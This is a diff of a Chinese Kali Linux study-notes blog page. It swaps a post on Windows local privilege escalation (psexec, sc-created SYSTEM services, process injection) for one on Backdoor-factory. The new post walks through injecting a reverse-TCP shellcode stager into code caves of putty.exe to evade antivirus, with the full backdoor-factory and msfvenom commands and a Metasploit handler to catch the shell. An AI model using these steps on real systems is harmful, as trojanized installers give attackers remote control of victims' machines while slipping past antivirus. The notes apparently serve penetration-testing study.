@@ -79,16 +79,23 @@
 
 
 
-<meta name="description" content="1. 本地提权 已实现本地低权限账号登录 远程溢出 直接获得账号密码   希望获取更高权限 实现对目标进一步控制    2. 本地提权 系统账号之间权限隔离（系统账号和应用程序账号） 操作系统安全的基础 用户空间 内核空间   系统账号 用户账号登陆时获取权限令牌（每次生成的令牌都有随机数） 服务账号无需用户登陆已在后台启动服务    4. 本地提权 Windows User Administr">
+<meta name="description" content="1. Backdoor-factory ▲ 2020.2.15 Backdoor-factory已不再受支持 ▲ 2020.2.15 本机自带的backdoor-factory存在坑，需要从github上下载进行运行 ▲ 2020.2.15 Backdoor-factory链接https:&#x2F;&#x2F;github.com&#x2F;secretsquirrel&#x2F;the-backdoor-factory.git P">
 <meta name="keywords" content="安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Kali Linux笔记(三十)：本地提权（WINDOWS）">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;17&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81)%EF%BC%9A%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83&#x2F;index.html">
+<meta property="og:title" content="Kali Linux笔记(九十三)：Backdoor-factory">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;15&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B8%89)%EF%BC%9ABackdoor-factory&#x2F;index.html">
 <meta property="og:site_name" content="Tomas&#39;Blog">
-<meta property="og:description" content="1. 本地提权 已实现本地低权限账号登录 远程溢出 直接获得账号密码   希望获取更高权限 实现对目标进一步控制    2. 本地提权 系统账号之间权限隔离（系统账号和应用程序账号） 操作系统安全的基础 用户空间 内核空间   系统账号 用户账号登陆时获取权限令牌（每次生成的令牌都有随机数） 服务账号无需用户登陆已在后台启动服务    4. 本地提权 Windows User Administr">
+<meta property="og:description" content="1. Backdoor-factory ▲ 2020.2.15 Backdoor-factory已不再受支持 ▲ 2020.2.15 本机自带的backdoor-factory存在坑，需要从github上下载进行运行 ▲ 2020.2.15 Backdoor-factory链接https:&#x2F;&#x2F;github.com&#x2F;secretsquirrel&#x2F;the-backdoor-factory.git P">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-01-05T02:45:44.138Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=0d39gOGFNMUbsTxtVe3rgh1C0BAmNt5198rl3YAiSu_BaPMv4s9OO4sRcYzxZHaBW9yo96wj79fp9YvZErRU8FJKhBOmA9IGU0dv2mb0vDzKstUakhYfpX9ei0Znp73z_aE5BT0&amp;file_name=&#x2F;msf%E4%BD%BF%E7%94%A8patch%E6%96%B9%E6%B3%95.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=9d63erCVrgW_6sHoSiGjgV6lxrog7JamOb40CgvEegA0LvJ8wX2iMw5jj0z9gfhXnwpC1dqtr8QbvzDgJCMOadeLSdNmKuTnXuikGnhCnGNnqC4uEhRQ8BbCQLF8uM3o&amp;file_name=&#x2F;%E4%BB%A3%E7%A0%81%E6%B4%9E%E7%A4%BA%E4%BE%8B.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=214dSOwXB0p4uUPdKomYlBMvh8lYxDishvPdWcr4XM6Wdf2mBk294qPOTdk6pCUWfprJoj1OrALXxwzrYCylsFtWD8Wgufb_FAE8ku7R3F5JGxy0ktT52OQYUHwrbRAa&amp;file_name=&#x2F;%E4%BB%A3%E7%A0%81%E6%B4%9E%E8%B7%B3%E8%BD%AC.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=721fjA15I5_vSh9NhqlJEgIIcc3JFWfr9mp3qVH-3FxfrutwVQInLzoDKv4Hbk_r-A_fVU2nJrDWQkzj_N9gXu0AhOquqOqyBNbMc7Ed76AYk3rvB6rv&amp;file_name=&#x2F;bdf_p1.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=0368Ps19J_NYSG6_Werj9nSpGkPbtOrLqUdRA3fUw7m31QBXAQF64288xNjpZ7AnWJPJ5NPOQkJhrFyWqL-3zOPeBULnjH_Q9-rtmWC10f8IZS9jS-fL&amp;file_name=&#x2F;bdf_p2.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=ecc4Fi7SOURxMyzSIKsh7WGeiW64iZOefj5VxcLHZmbRzruZAno3BBGayQo5KvBTiZIiPDo42bTLyE0iwi7ngU349fOalRyOK3Y7gIDZHfHzwpiGhvJB&amp;file_name=&#x2F;bdf_p3.PNG">
+<meta property="og:updated_time" content="2020-02-15T04:46:01.132Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=0d39gOGFNMUbsTxtVe3rgh1C0BAmNt5198rl3YAiSu_BaPMv4s9OO4sRcYzxZHaBW9yo96wj79fp9YvZErRU8FJKhBOmA9IGU0dv2mb0vDzKstUakhYfpX9ei0Znp73z_aE5BT0&amp;file_name=&#x2F;msf%E4%BD%BF%E7%94%A8patch%E6%96%B9%E6%B3%95.PNG">
 
 
 
@@ -118,13 +125,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/12/17/Kali Linux笔记(三十)：本地提权/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/02/15/Kali Linux笔记(九十三)：Backdoor-factory/"/>
 
 
 
 
 
-  <title>Kali Linux笔记(三十)：本地提权（WINDOWS） | Tomas'Blog</title>
+  <title>Kali Linux笔记(九十三)：Backdoor-factory | Tomas'Blog</title>
   
 
 
@@ -243,7 +250,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/17/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81)%EF%BC%9A%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/15/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B8%89)%EF%BC%9ABackdoor-factory/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Tomas">
@@ -260,7 +267,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(三十)：本地提权（WINDOWS）</h1>
+          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(九十三)：Backdoor-factory</h1>
         
 
         <div class="post-meta">
@@ -272,8 +279,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-17T20:06:10+08:00">
-                2019-12-17
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-15T12:47:03+08:00">
+                2020-02-15
               </time>
             
 
@@ -326,7 +333,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  462 字
+                  699 字
                 </span>
               
 
@@ -342,7 +349,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  1 分钟
+                  2 分钟
                 </span>
               
             </div>
@@ -364,89 +371,134 @@
 
       
         <hr>
-<h4 id="1-本地提权"><a href="#1-本地提权" class="headerlink" title="1. 本地提权"></a>1. 本地提权</h4><ul>
-<li>已实现本地低权限账号登录<ul>
-<li>远程溢出</li>
-<li>直接获得账号密码</li>
-</ul>
-</li>
-<li>希望获取更高权限<ul>
-<li>实现对目标进一步控制</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-本地提权"><a href="#2-本地提权" class="headerlink" title="2. 本地提权"></a>2. 本地提权</h4><ul>
-<li>系统账号之间权限隔离（系统账号和应用程序账号）<ul>
-<li>操作系统安全的基础</li>
-<li>用户空间</li>
-<li>内核空间</li>
-</ul>
-</li>
-<li>系统账号<ul>
-<li>用户账号登陆时获取权限令牌（每次生成的令牌都有随机数）</li>
-<li>服务账号无需用户登陆已在后台启动服务</li>
+<h4 id="1-Backdoor-factory"><a href="#1-Backdoor-factory" class="headerlink" title="1. Backdoor-factory"></a>1. Backdoor-factory</h4><ul>
+<li>▲ 2020.2.15 Backdoor-factory已不再受支持</li>
+<li>▲ 2020.2.15 本机自带的backdoor-factory存在坑，需要从github上下载进行运行</li>
+<li>▲ 2020.2.15 Backdoor-factory链接<a href="https://github.com/secretsquirrel/the-backdoor-factory.git" target="_blank" rel="noopener">https://github.com/secretsquirrel/the-backdoor-factory.git</a></li>
+<li>Patch<ul>
+<li>通过替换EXE、DLL、注册表等方法修复系统漏洞或问题的方法</li>
+<li>BDF：向二进制文件中增加或者删除代码内容<ul>
+<li>某些受保护的二进制程序无法patch</li>
+<li>存在一定概率文件会被patch坏掉</li>
 </ul>
 </li>
 </ul>
-<h4 id="4-本地提权"><a href="#4-本地提权" class="headerlink" title="4. 本地提权"></a>4. 本地提权</h4><ul>
-<li>Windows<ul>
-<li>User</li>
-<li>Administrator</li>
-<li>System（启动运行系统内核级别的权限，真正有最大权限的账号）</li>
+</li>
+<li>后门工厂<ul>
+<li>适用于windows PE x32/x64和Linux ELF x32/x64（OSX）</li>
+<li>支持msf payload、自定义payload</li>
 </ul>
 </li>
-<li>Linux<ul>
-<li>User</li>
-<li>Root</li>
+<li>将shellcode代码patch进模板文件，躲避AV检查</li>
+<li>Python语言编写</li>
+<li>msf使用的patch方法<ul>
+<li>覆盖程序入口<ul>
+<li><strong><code>🔺命令：msfvenom -p windows/shell/reverse_tcp ……</code></strong></li>
 </ul>
 </li>
-</ul>
-<blockquote>
-<pre><code>Windows下，User权限包含在Administrator，System有Administrator所没有的权限，Administrator有System所没有的权限</code></pre></blockquote>
-<h4 id="5-ADMIN提权为SYSTEM"><a href="#5-ADMIN提权为SYSTEM" class="headerlink" title="5. ADMIN提权为SYSTEM"></a>5. ADMIN提权为SYSTEM</h4><ul>
-<li>Windows system账号<ul>
-<li>系统设置管理功能</li>
-<li>SysInternal Suit</li>
+<li>创建新的线程执行shellcode并跳回源程序入口<ul>
+<li><strong><code>🔺命令：msfvenom -p windows/shell/reverse_tcp –k</code></strong></li>
+<li>增加代码片段跳转执行后跳回源程序入口</li>
 </ul>
 </li>
 </ul>
-<blockquote>
-<p>   <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sysinternals/downloads/</a><br>   psexec.exe -i -s -d taskmgr<br>   psexec.exe -i -s cmd<br>   需要一个whoami的工具，需要放到Window下的System32根目录下</p>
-</blockquote>
+</li>
+</ul>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=0d39gOGFNMUbsTxtVe3rgh1C0BAmNt5198rl3YAiSu_BaPMv4s9OO4sRcYzxZHaBW9yo96wj79fp9YvZErRU8FJKhBOmA9IGU0dv2mb0vDzKstUakhYfpX9ei0Znp73z_aE5BT0&file_name=/msf%E4%BD%BF%E7%94%A8patch%E6%96%B9%E6%B3%95.PNG" alt="msf使用的patch方法"></p>
 <ul>
-<li>Windows XP下   <ul>
-<li><strong><code>🔺命令：at 稍后的时间 /interactive cmd</code></strong></li>
+<li>CTP方法<ul>
+<li>增加新的代码段section，与msf -k方法类似</li>
+<li>使用现有的代码裂缝/洞（code cave）存放shellcode<ul>
+<li>二进制文件中超过两个字节的连续x00区域（代码片段间区域）</li>
+<li>根据统计判断代码洞是编译器在进行编译时造成的，不同的编译器造成的代码洞的大小不同</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：cp which cat</code></strong></li>
+<li><strong><code>🔺命令：hexeditor cat</code></strong></li>
 </ul>
 </li>
 </ul>
-<blockquote>
-<pre><code>在Windows XP下：
-切换权限：taskmgr → explorer（图形化kill）→ 文件 → explorer</code></pre></blockquote>
+</li>
+</ul>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=9d63erCVrgW_6sHoSiGjgV6lxrog7JamOb40CgvEegA0LvJ8wX2iMw5jj0z9gfhXnwpC1dqtr8QbvzDgJCMOadeLSdNmKuTnXuikGnhCnGNnqC4uEhRQ8BbCQLF8uM3o&file_name=/%E4%BB%A3%E7%A0%81%E6%B4%9E%E7%A4%BA%E4%BE%8B.PNG" alt="代码洞示例"></p>
 <ul>
-<li>Windows 7 or 8下 ▲ 2019.12.17 [SC] OpenSCManager失败：5<ul>
-<li><strong><code>🔺命令：sc Create syscmd（服务名称） binPath=&quot;cmd /K start&quot; type=own type=interact</code></strong></li>
-<li><strong><code>🔺命令：sc start syscmd</code></strong></li>
+<li>单个代码洞大小不足以存放完整的shellcode<ul>
+<li>多代码洞跳转（非顺序执行）<ul>
+<li>初期免杀率可达100%</li>
+</ul>
+</li>
+<li>结合msf的stager方法</li>
+</ul>
+</li>
+<li>Path选项<ul>
+<li>附加代码段</li>
+<li>单代码洞注入</li>
+<li>多代码洞注入</li>
 </ul>
 </li>
 </ul>
-<blockquote>
-<pre><code>在Windows 7 or 8下：
-service.msc，创建System服务进程
-需要一个whoami的工具，需要放到Window下的System32根目录下</code></pre></blockquote>
-<blockquote>
-<pre><code>HelpAssistant账号为远程协助账号，允许别人的远程连接
-图形化界面：我的电脑 → 计算机管理 → 本地用户和组 → 用户/组
-修改密码：net user 用户名 *
-查看账号：net user
-查看账户权限：net user 账号名称（关注所属组）</code></pre></blockquote>
-<h4 id="6-注入进程提权"><a href="#6-注入进程提权" class="headerlink" title="6. 注入进程提权"></a>6. 注入进程提权</h4><ul>
-<li>隐蔽痕迹</li>
-<li><strong><code>🔺命令：pinjector.exe</code></strong><ul>
-<li><a href="http://www.tarasco.org/security/Process_Injector" target="_blank" rel="noopener">http://www.tarasco.org/security/Process_Injector</a></li>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=214dSOwXB0p4uUPdKomYlBMvh8lYxDishvPdWcr4XM6Wdf2mBk294qPOTdk6pCUWfprJoj1OrALXxwzrYCylsFtWD8Wgufb_FAE8ku7R3F5JGxy0ktT52OQYUHwrbRAa&file_name=/%E4%BB%A3%E7%A0%81%E6%B4%9E%E8%B7%B3%E8%BD%AC.PNG" alt="代码洞跳转"></p>
+<h4 id="2-BDF的使用"><a href="#2-BDF的使用" class="headerlink" title="2. BDF的使用"></a>2. BDF的使用</h4><ul>
+<li>参数<ul>
+<li>-S（检测文件是否支持注入）</li>
+<li>-l（可限定字节数的代码洞）</li>
+<li>-H（指定IP地址）</li>
+<li>-J（指定端口）</li>
 </ul>
 </li>
-<li><strong><code>🔺命令：pinjector.exe -p PID的值 cmd 指定端口</code></strong>  </li>
+<li>检查二进制文件是否支持代码注入（可使用putty）<ul>
+<li><strong><code>🔺命令：backdoor-factory -f putty.exe –S</code></strong></li>
 </ul>
+</li>
+<li>查看cave大小<ul>
+<li><strong><code>🔺命令：backdoor-factory -f putty.exe -c</code></strong> </li>
+</ul>
+</li>
+<li>显示可用payload<ul>
+<li><strong><code>🔺命令：backdoor-factory -f putty.exe -s show</code></strong></li>
+<li>iat_reverse_tcp_stager_threaded（分步骤反弹shell的tcp连接）</li>
+</ul>
+</li>
+<li>免杀效果对比（注入文件大小会发生改变）<ul>
+<li><strong><code>🔺命令：backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666</code></strong>（单一代码洞注入）</li>
+<li><strong><code>🔺命令：backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666 –J</code></strong>（多代码洞注入）</li>
+<li><strong><code>🔺命令：backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -a -H 192.168.20.8 -P 6666</code></strong>（附加注入）</li>
+</ul>
+</li>
+<li>验证有效性<ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：msfconsole</code></strong></li>
+<li><strong><code>🔺命令：use exploit/multi/handler</code></strong></li>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong></li>
+<li><strong><code>🔺命令：show options</code></strong></li>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：set LPORT Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：exploit -j</code></strong></li>
+</ul>
+</li>
+<li>物理主机<ul>
+<li>双击putty.exe看是否能正常执行</li>
+<li>查看shell的免杀效果（查杀网站）</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>看是否能连接上shell</li>
+<li><strong><code>🔺命令：shell</code></strong></li>
+<li><strong><code>🔺命令：ipconfig</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>与veil-evasion集成</li>
+<li>IAT——import address table<ul>
+<li>指针指向WinAPI地址，被称为thunks（形实转换程序），地址预定义</li>
+</ul>
+</li>
+</ul>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=721fjA15I5_vSh9NhqlJEgIIcc3JFWfr9mp3qVH-3FxfrutwVQInLzoDKv4Hbk_r-A_fVU2nJrDWQkzj_N9gXu0AhOquqOqyBNbMc7Ed76AYk3rvB6rv&file_name=/bdf_p1.PNG" alt="bdf_p1"></p>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=0368Ps19J_NYSG6_Werj9nSpGkPbtOrLqUdRA3fUw7m31QBXAQF64288xNjpZ7AnWJPJ5NPOQkJhrFyWqL-3zOPeBULnjH_Q9-rtmWC10f8IZS9jS-fL&file_name=/bdf_p2.PNG" alt="bdf_p2"></p>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=ecc4Fi7SOURxMyzSIKsh7WGeiW64iZOefj5VxcLHZmbRzruZAno3BBGayQo5KvBTiZIiPDo42bTLyE0iwi7ngU349fOalRyOK3Y7gIDZHfHzwpiGhvJB&file_name=/bdf_p3.PNG" alt="bdf_p3"></p>
 
       
     </div>
@@ -477,8 +529,8 @@ service.msc，创建System服务进程
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/12/17/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E4%B9%9D)%EF%BC%9A%E5%90%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%98%B6%E6%AE%B5/" rel="next" title="Kali Linux笔记(二十九)：后漏洞利用阶段">
-                <i class="fa fa-chevron-left"></i> Kali Linux笔记(二十九)：后漏洞利用阶段
+              <a href="/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%BA%8C)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--%E7%B2%BE%E7%A1%AE%E5%AE%9A%E4%BD%8D%E6%9F%A5%E6%9D%80%E5%AD%97%E7%AC%A6%E4%B8%B2/" rel="next" title="Kali Linux笔记(九十二)：免杀技术--精确定位查杀字符串">
+                <i class="fa fa-chevron-left"></i> Kali Linux笔记(九十二)：免杀技术--精确定位查杀字符串
               </a>
             
           </div>
@@ -486,10 +538,6 @@ service.msc，创建System服务进程
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/12/22/Kali%20Linnx%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%BA%8C)%EF%BC%9A%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83/" rel="prev" title="Kali Linux笔记(三十二)：配置不当提权">
-                Kali Linux笔记(三十二)：配置不当提权 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -659,7 +707,7 @@ service.msc，创建System服务进程
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-本地提权"><span class="nav-number">1.</span> <span class="nav-text">1. 本地提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-本地提权"><span class="nav-number">2.</span> <span class="nav-text">2. 本地提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-本地提权"><span class="nav-number">3.</span> <span class="nav-text">4. 本地提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-ADMIN提权为SYSTEM"><span class="nav-number">4.</span> <span class="nav-text">5. ADMIN提权为SYSTEM</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-注入进程提权"><span class="nav-number">5.</span> <span class="nav-text">6. 注入进程提权</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Backdoor-factory"><span class="nav-number">1.</span> <span class="nav-text">1. Backdoor-factory</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-BDF的使用"><span class="nav-number">2.</span> <span class="nav-text">2. BDF的使用</span></a></li></ol></div>
             
 
           </div>
